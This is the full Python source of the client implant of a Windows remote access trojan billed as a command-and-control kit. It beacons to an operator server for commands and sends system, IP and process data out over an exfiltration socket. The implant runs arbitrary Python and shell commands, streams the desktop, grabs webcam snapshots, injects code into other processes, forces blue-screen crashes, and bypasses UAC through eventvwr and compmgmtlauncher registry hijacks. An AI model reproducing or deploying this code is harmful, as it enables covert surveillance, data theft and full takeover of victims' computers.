#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.22
# -------------------------------------------------------------
import socket
import base64
import ctypes
import platform
import os
import subprocess
import threading
import struct
import winreg
import cv2
import psutil
from PIL import ImageGrab
from time import sleep
from cryptography.fernet import Fernet
from pymem import Pymem

SEP = '<sep>' #Create static seperator string
BUFFER = 4096 #Create static buffer int
SERV_PORT = #Create static server port for agent to receive commands
EXFIL_PORT = #Create static port for agent to exfiltrate data to server
STRM_PORT = #Create static port for agent to send frames

CURRENT_DIR = f"{os.getcwd()}\\{os.path.basename(__file__)}" #Get full filepath of current process

class MultiProcessor:
    #Function will start a child thread with no argument to the target function
    def start_child_thread(self,function):
        process = threading.Thread(target=function)
        process.daemon = True
        process.start()

    #Function will create target thread for function that taks one argurment
    def start_child_thread_arg(self,function,arg):
        arg = [arg]
        process = threading.Thread(target=function,args=arg)
        process.daemon = True
        process.start()

class Utilitys:
    #Function will return windows version with a powershell command
    def get_windows_version(self):
        command = subprocess.Popen(['powershell', '(Get-WmiObject -class Win32_OperatingSystem).Version'],stdout=subprocess.PIPE) #Run powershell command and pipe output
        version_output = command.stdout.read().decode()  #Read output from powershell command
        version_output = version_output.replace('\n','') #Replace new line with empty string
        return version_output.strip('\r')                #Strip carriage return and return the output

    #Function will get computers local ip and return it as string
    def get_local_ip(self):
        local_ip = socket.gethostbyname(socket.gethostname()) #Resolve system name
        print(local_ip)
        return local_ip                                       #Return local ip address

    #Function checks if process is running as admin and returns boolean value with string
    def check_process_privilege(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "Administrator"
        else:
            return "User"

    #Function takes a string input and returns it in bytes
    def convert_string_to_bytes(self, string):
        string_to_bytes = str(string).encode()                                      #Take input string and encode it
        return string_to_bytes                                                      #Return string in byte value

    #Function will run systeminfo & ipconfig commands and then return the output
    def extract_sys_ip_info(self):
        system_info = subprocess.Popen('systeminfo', stdout=subprocess.PIPE) #Run the system info command
        sysinfo_output = system_info.stdout.read().decode()                  #Store the output in a variable
        ip_config = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)     #Run ipconfig command
        ip_config_output = ip_config.stdout.read().decode()                  #Store the output in a variable
        extracted_info = f'{sysinfo_output}\n{ip_config_output}'             #Join the two variables
        return extracted_info                                                #Return the output

    #Returns bool based on webcam detection
    def check_for_webcam(self):
        webcam = cv2.VideoCapture(0)        #Create webcam object for the first webcam that is found
        if not webcam.isOpened():           #If it can't be opened
            webcam.release()                #Release the webcam
            return False                    #Return false
        webcam.release()                    #Else if the cam can be opened, release
        return True                         #return true

    #Function will return the root registry key based on bool
    def get_root_key(self,local_machine):
        if local_machine:                           #If local machine
            root_key = winreg.HKEY_LOCAL_MACHINE    #Set root to HKLM
        elif not local_machine:                     #If not local machine
            root_key = winreg.HKEY_CURRENT_USER     #set root to HKCU
        return root_key                             #Return the root key

class SystemManager:

    #Function will crash the computer with a blue screen
    def blue_screen(self):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6)

    #Function will reboot the computer without a wait time
    def restart_computer(self):
        subprocess.run('shutdown /r /t 0',shell=True)

    #Function will shut down the computer without warning.
    def shutdown_computer(self):
        subprocess.run('shutdown /p')

    #Function will send back a list of running process's to the server
    def extract_process_list(self):
        process_string = ''                     # Define a local string to store information about the process's
        for process in psutil.process_iter():   # For each process found in the running process's
            process_name = process.name()       # Get process name
            pid = process.pid                   # Get pid of process
            try:
                username = process.username()   # Get username
            except psutil.AccessDenied:
                username = 'NT AUTHORITY\SYSTEM' # If we are running in userland, admin process's will raise an error on call to username. manually set uname.
            string = f'{process_name}{SEP}{str(pid)}{SEP}{username}{SEP}\n' #Create string
            process_string += string    # Append string to local master string
        ExfilSocket().exfil_socket_send(process_string) #Send local master string to server

    #Function will kill a task by the pid passed as parameter and send the output to the server
    def kill_task(self,pid):
        command = subprocess.Popen(['taskkill','/pid',str(pid),'/f'],stdout=subprocess.PIPE,shell=True) #attempt to kill process by pid
        output = command.stdout.read().decode()                                                    #Parse the output
        ExfilSocket().exfil_socket_send(output)                                                    #Send the output to the server

    #Function will either create or moidfy a registry key and return a bool value
    def handle_registry_key(self,modify,root_key_bool,key_path,key_value,key_name):
        root_key = Utilitys().get_root_key(root_key_bool) #Get root key string
        try:
            if modify:                                    #If the modify bool is enabled, open the key
                reg_key = winreg.OpenKey(root_key,key_path,0,winreg.KEY_ALL_ACCESS)
            elif not modify:                              #elif modify != enabled, create a key
                reg_key = winreg.CreateKey(root_key,key_path)
            winreg.SetValueEx(reg_key,key_name,0,winreg.REG_SZ,key_value) #Set the value for the key
            winreg.CloseKey(reg_key)                                      #Close the key
            return True                                                   #Return true for success
        except Exception:
            return False                                                  #Return false if there's an issue

    #Function will clean up a registry key or delete the value held inside
    def clean_up_key(self,delete,root_key_bool,key_path,name):
        root_key = Utilitys().get_root_key(root_key_bool)       #Get the root key
        try:
            if not delete:                                      #If delete is not enabled
                key = winreg.OpenKey(root_key,key_path,0,winreg.KEY_ALL_ACCESS) #
                winreg.DeleteValue(key,name)
                winreg.CloseKey(key)
            if delete:
                winreg.DeleteKey(root_key,key_path)
        except Exception:
            pass

class Elevation:

    #Init strings for later usage
    def __init__(self):
        self.eventvwr_key = os.path.join('Software\\Classes\\mscfile\\shell\\open\\command')

    #Function will attempt to elevate priveleges via the eventvwr bypass
    def uac_eventvwr(self):
        if SystemManager().handle_registry_key(True,False,self.eventvwr_key,CURRENT_DIR,None):  #If the registry key can be modified
            subprocess.run('eventvwr',shell=True)                                               #Run event viewer to trigger the exploit
            SystemManager().clean_up_key(False,False,self.eventvwr_key,None)                    #Delete the value that was assigned
            ExfilSocket().exfil_socket_send(ClientSocket().good)                                #Tell the server the action was successful
        else:                                                                                   #If the registry key couldn't be modified,
            ExfilSocket().exfil_socket_send(ClientSocket().bad)                                 #Inform the server of the issue

    #Function attempt to elevate privileges to administrator via the cmptmgmtlauncher bypass
    def uac_compmgmt(self):
        if SystemManager().handle_registry_key(True,False,self.eventvwr_key,CURRENT_DIR,None):   #If the registry key can be modified
            subprocess.run('compmgmtlauncher',shell=True)                                        #Run compmgmt to trigger the exploit
            SystemManager().clean_up_key(False,False,self.eventvwr_key,None)                     #Delete the value that was assigned
            ExfilSocket().exfil_socket_send(ClientSocket().good)                                 #Tell the server the action was successful
        else:
            ExfilSocket().exfil_socket_send(ClientSocket().bad)                                  #Inform server that key couldn't be modified if there was an issue

class Encryption:

    #Function will take string value and encrypt it with the master key and return the encoded value
    def encrypt_packet(self,data_to_encrypt):
        encryption_object = Fernet(MASTER_KEY)                      #create encryption object
        encoded_data = data_to_encrypt.encode()                     #Encode the data as bytes
        encrypted_data = encryption_object.encrypt(encoded_data)    #Encrypt the data
        return encrypted_data                                       #Return the encrypted data

    #Function will take encoded value, decrypt it with the master key and return the plaintext value
    def decrypt_packet(self,data_to_decrypt):
        decryption_object = Fernet(MASTER_KEY)                      #Create decryption object
        decrypted_data = decryption_object.decrypt(data_to_decrypt) #decrypt the encrypted data
        plaintext = decrypted_data.decode()                         #decode the decrypted data
        return plaintext                                            #return the plaintext value of the data

class ClientSocket:
    # Keep all strings in an init function for later usage
    def __init__(self):
        self.heartbeat = 'echo'
        self.dns_address = ''
        self.env_var = 'USERNAME'
        self.python_flag = 'python'
        self.system_command = 'system'
        self.reconnect_to_server = 'reconnect'
        self.ping_server = 'ping'
        self.sys_info_exfil = 'sys_info'
        self.blue_screen = 'bsod'
        self.restart_computer = 'restart'
        self.shutdown_computer = 'shutdown'
        self.screenshot = 'screenshot'
        self.stream_desktop = 'stream_desktop'
        self.disconnect = 'disconnect'
        self.process_manager = 'proc_list'
        self.term_process = 'terminate'
        self.snapshot = 'snap_shot'
        self.inject_python = 'inject_pie'
        self.good = 'good'
        self.bad = 'bad'
        self.esc_eventvwr = 'esc_eventvwr'
        self.esc_compmgmt = 'esc_compmgmt'

    #Function will connect to server to initiate handshake
    def connect_to_server(self):
        domain = socket.gethostbyname(self.dns_address)                     #Get IP of domain
        self.client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       #Create client socket object
        while True:                                                                 #Loop infinitely until client connects
            try:
                print('Connecting')
                self.client_socket.connect((domain,SERV_PORT))                          #Connect to domain on port
                break                                                               #Break loop if connection is successfull
            except socket.error:                                                    #If connection is unnsuccessful.....
                print('Unsuccessful. Reconnecting')
                self.client_socket.close()                                          #Destory socket object
                sleep(10)                                                           #Sleep for 10 seconds
                return self.connect_to_server()                                     #Return function to create new socket and reinitiate the connection
        print('Connection Successful. Continuing')
        return self.initiate_handshake()

    #Function begins the process of creating a secure channel between the client and server
    def initiate_handshake(self):
        system_name = socket.gethostname()                                          #Get the system name
        self.client_socket.send(Utilitys().convert_string_to_bytes(system_name))    #Send the system name to the server
        print(f'sent system name: {system_name}. Waiting for encryption key...')
        return self.negotiate_encryption()

    #Function will get encryption key from server, decode it from base 64 and set the global variable for the master communication key
    def negotiate_encryption(self):
        global MASTER_KEY                                                           #Set master key as global variable
        b64_encoded_key = self.client_socket.recv(BUFFER)                           #Decode b64 encoding
        MASTER_KEY = base64.b64decode(b64_encoded_key)                              #Set master key equal to decoded encryption key
        print(f'Got encryption key {MASTER_KEY}')
        return self.extract_information()

    #Function extracts information from computer and sends it over to the server for further processing
    def extract_information(self):
        local_ip = Utilitys().get_local_ip()                            #Get local ip
        operating_system = f'{platform.system()} {platform.release()}'  #Platform and release 'Windows' and '10' for example
        current_user = os.environ[self.env_var]                           #get the username of the current user
        privilege = Utilitys().check_process_privilege()                #get the current process privilege
        windows_version = Utilitys().get_windows_version()              #get the windows version
        information_array = []                                          #create array and append all info to it
        information_array.append(local_ip)
        information_array.append(operating_system)
        information_array.append(current_user)
        information_array.append(privilege)
        information_array.append(windows_version)
        print(information_array)
        self.client_socket.send(Encryption().encrypt_packet(str(information_array)))    #send array over to server
        return self.complete_handshake()

    #Function completes handshake by starting an echo with the server in a different process. Returns function to get commands from server
    def complete_handshake(self):
        MultiProcessor().start_child_thread(function=self.start_echo)
        return self.main()

    #Function will send echo to server every 60 seconds. If the server doesnt get the echo or client disconnects, server will remove client from gui
    def start_echo(self):
        while True:
            self.client_socket.send(Encryption().encrypt_packet(self.heartbeat)) #Send echo
            sleep(60)

    #Main process loop. Receive command from server
    def main(self):
        while True:                                        #Start infinite loop
            server_command = self.receive_server_command() #Receive decrypted data from server
            server_command = server_command.split(SEP)     #Seperate server command for parsing
            action_flag = server_command[0]                #Get action flag from server
            if action_flag == self.python_flag:            #If the flag is for python execution
                CodeExecution().execute_python_code(server_command[1]) #Execute the code to the right of the seperator
            if action_flag == self.system_command:                      #If the action flag is for a system command
                CodeExecution().execute_system_command(server_command[1])   #Execute the the code via cmd with subprocess
            if action_flag == self.reconnect_to_server:                 #If the action flag is to reconnect,
                self.client_socket.close()                              #Close the current socket
                return self.connect_to_server()                         #Send main thread back to the connect function to reconnect to server
            if action_flag == self.ping_server:                         #If the action flag is a ping from the server
                ExfilSocket().exfil_socket_send(f'{socket.gethostname()} Is Online') #Tell the server that the host is online with the system name
            if action_flag == self.sys_info_exfil:                                   #If the action flag is to exfil system & ip info
                ExfilSocket().exfil_socket_send(f'{Utilitys().extract_sys_ip_info()}')#Create an exfil socket and send the info
            if action_flag == self.blue_screen:                                       #If the action is a bluescreen
                self.client_socket.close()                                            #Close the current socket
                SystemManager().blue_screen()                                         #Call the crash function to blue screen the system
            if action_flag == self.restart_computer:                                  #If the action is to reboot
                SystemManager().restart_computer()                                    #Reboot computer
            if action_flag == self.shutdown_computer:                                 #If the action is to shutdown computer
                SystemManager().shutdown_computer()                                   #Shutdown the computer
            if action_flag == self.stream_desktop:
                MultiProcessor().start_child_thread_arg(StreamSocket().stream_desktop,arg=False)
            if action_flag == self.screenshot:                                        #If the action is screenshot
                StreamSocket().stream_desktop(screenshot=True)                        #Send a screenshot
            if action_flag == self.disconnect:                                        #If the action is to disconnect
                exit()                                                                #Exit program
            if action_flag == self.process_manager:                                   #If the action is to get the process's running on the machine
                SystemManager().extract_process_list()                                #Send process's to server
            if action_flag == self.term_process:                                      #if the action is to kill a process
                SystemManager().kill_task(server_command[1])                          #kill the task by pid received from server
            if action_flag == self.snapshot:                                          #if the action is to send a snapshot from the webcam
                StreamSocket().webcam_snapshot()                                      #Send a webcam snapshot
            if action_flag == self.inject_python:                                     #If the action is to inject some python code,
                CodeExecution().inject_and_exec(server_command[1],server_command[2])  #Inject python code
            if action_flag == self.esc_eventvwr:                                      #If the action is to elevate perms via eventviewer
                Elevation().uac_eventvwr()                                            #Elevate perms with the eventvwr method
            if action_flag == self.esc_compmgmt:                                      #If the action is to elevate perms via compmgmtlauncher
                Elevation().uac_compmgmt()                                            #Elevate perms with the compmgmtlauncher method

    #Function will retrieve all data sent by server socket
    def recv_all_data(self):
        try:
            bytes_data = b''                                                #Create empty bytes object
            initial_data = self.client_socket.recv(BUFFER)                  #Get initial data from server
            data_size = initial_data.split('|'.encode())                    #Grabe the size of the data from the forefront
            if len(initial_data) < int(str(data_size[0].decode())):         #If the length of the init data is less than the size of the data sent
                bytes_data+=data_size[1]                                    #Add the encrypted data to the bytes object
                while len(bytes_data) != int(str(data_size[0].decode())):   #While the length of the bytes obj is not equal to the size of the encrypted data
                    partial_data = self.client_socket.recv(BUFFER)          #Receive more data
                    bytes_data += partial_data                              #Add data to bytes object
                return bytes_data                                           #Return the bytes data when the data received == the data sent
            else:                                                           #Else the initial data is all the data
                return data_size[1]                                         #Return the encrypted data half of the array from the split

        except ValueError:                                                  #If there is a value error, indicating the connection with the server was lost
            return self.connect_to_server()                                 #connect back to the server

        except ConnectionResetError:                                        #If the server shuts down in the middle of the transfer
            return self.connect_to_server()                                 #Connect back to it

    #Funtion will get data from the server and return it as plaintext. If the server disconnects, the client will attempt
    #To connect back
    def receive_server_command(self):
        print('Getting command from server')
        data = self.recv_all_data()             #Receive entire string of data in bytes
        if not data:                            #If the agent does not receive data/server disconnects
            return self.connect_to_server()     #Reconnect to the server
        plain_text_data = Encryption().decrypt_packet(data) #Decrypt byte string to plaintext
        return plain_text_data                              #Return Plaintext data

    #Function will send data back to server
    def send_data_to_server(self,data):
        data_to_send = Encryption().encrypt_packet(data)          #Encrypt the data
        self.client_socket.send(data_to_send)                     #Send data to server

class ExfilSocket:

    #Function will create socket, connect to server, deliver data and destroy the socket
    def exfil_socket_send(self, exfil_data):
        domain = socket.gethostbyname(ClientSocket().dns_address)           #Resolve domain to ip address
        exfil_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)     #Create exfil socket
        exfil_socket.connect((domain,EXFIL_PORT))                           #Connect to server
        encrypted_data = Encryption().encrypt_packet(exfil_data)            #Encrypt the data
        exfil_socket.sendall(encrypted_data)                                #Send the encrypted data to the server
        exfil_socket.close()                                                #Close and destroy the socket

class StreamSocket:

    def __init__(self):
        self.image_file_path = str(f'{os.getenv("userprofile")}\\AppData\\Local\\Temp\\c.jpg')

    #Function will take a screenshot, save, read and return the data
    def take_screenshot(self):
        screen_cap = ImageGrab.grab()                           #Take screenshot
        screen_cap.save(self.image_file_path, 'jpeg')           #Save the file
        with open(self.image_file_path, 'rb') as image_file:    #Open the image
            image_data = image_file.read()                      #Read the data
            image_file.close()                                  #Close the file
        return image_data                                       #Return the data

    #Function will take single or multiple screenshots depending on boolean parameter
    def stream_desktop(self,screenshot):
        StreamSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)         #Create socket
        StreamSocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        ip_address = socket.gethostbyname(ClientSocket().dns_address)           #Resolve dns
        StreamSocket.connect((ip_address,STRM_PORT))                            #connect to ip and streaming port
        if not screenshot:                                                      #If screenshot is false
            while True:                                                         #Start loop
                image_data = self.take_screenshot()                             #Take screenshot
                StreamSocket.sendall(struct.pack(">Q", len(image_data)))        #Send struct len
                StreamSocket.sendall(image_data)                                #Send the image data
        elif screenshot:                                                        #If screenshot is true
            image_data = self.take_screenshot()                                 #Take screenshot
            StreamSocket.sendall(struct.pack(">Q", len(image_data)))            #send struct len
            StreamSocket.sendall(image_data)                                    #send struct
        StreamSocket.close()                                                    #close socket

    #Function will send a snapshot of the webcam if one is present, else it will return a
    #message that prompts the server that it couldnt find it
    def webcam_snapshot(self):
        if not Utilitys().check_for_webcam():               #If the check function doesn't find a webcam
            ExfilSocket().exfil_socket_send('NoneFound')    #Notify the server
        else:                                               #else, the function returns true
            ExfilSocket().exfil_socket_send('Found')        #Notify server to continue handling
            stream_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Create socket
            stream_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Set sock opts
            ip_address = socket.gethostbyname(ClientSocket().dns_address)  # Resolve dns
            stream_sock.connect((ip_address, STRM_PORT))  # connect to ip and streaming port
            web_cam = cv2.VideoCapture(0)                   #Create webcam object
            ret, img = web_cam.read()                       #Capture image from webcam
            cv2.imwrite(self.image_file_path,img)           #Write image to file
            with open(self.image_file_path,'rb') as file:   #Read the image
                data = file.read()                          #Capture the date
                file.close()
            stream_sock.sendall(struct.pack(">Q",len(data)))    #the len of the data as a struct
            stream_sock.sendall(data)                           #Send the rest of the data
            stream_sock.close()                                 #Close socket

class CodeExecution():

    #Function will execute code given as parameter with the python interpreter
    def execute_python_code(self,python_code):
        def exec_(python_code):                 #Create local exec function
            try:
                exec(str(python_code)) #Execute code
            except Exception as error:          #If there's an error
                pass
        MultiProcessor().start_child_thread_arg(exec_,python_code)  #Start thread with code execution, main thread will continue communicating with server.

    #Function will execute system commands with subprocess module
    def execute_system_command(self,system_command):
        def exec_(system_command):                      #Create local exec function
            try:
                subprocess.run(system_command,shell=True)#Execute code
            except Exception as error:                   #If there's an error
                pass
        MultiProcessor().start_child_thread_arg(exec_,system_command) #Start new thread for shell commands. Main thread will continue to communicate with server

    #Function will inject a python interpreter into a process and then load
    #Python code to be executed by it.
    def inject_and_exec(self,process_name,python_code):
        process = Pymem(process_name)                   #Hook the process
        process.inject_python_interpreter()             #Inject the python dll
        process.inject_python_shellcode(python_code)    #Inject the python code into the code

ClientSocket().connect_to_server()